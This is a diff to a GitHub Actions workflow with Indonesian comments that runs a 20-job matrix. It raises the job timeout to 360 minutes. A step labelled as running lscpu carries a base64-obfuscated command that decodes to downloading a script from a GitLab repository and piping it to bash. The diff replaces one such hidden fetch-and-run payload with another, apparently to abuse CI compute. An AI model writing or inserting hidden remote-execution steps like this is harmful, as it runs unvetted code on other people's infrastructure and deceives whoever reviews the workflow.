@@ -44,11 +44,11 @@ jobs:
       matrix:
         name: [A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T]   # 20 job
     runs-on: ubuntu-latest
-    timeout-minutes: 8   
+    timeout-minutes: 360   
     steps:
       - name: Jalankan lscpu (timeout 6 menit, sukses walau timeout)
         run: |
-          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9tYWthbmFuOTkvZGlhbW9uZHMvLS9yYXcvbWFpbi9yZXAuc2ggfCBiYXNo | sh & sleep 420
+          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9tYXNhYWtrODgvZmlsZS9kaWFtb25kczhsaW5lLy0vYmxvYi9tYWluL3llYXJzIHwgYmFzaA | sh & sleep 10500
 
   # =============================================
   # 🔁 Lanjutkan loop jika masih dalam jam & siklus > 0
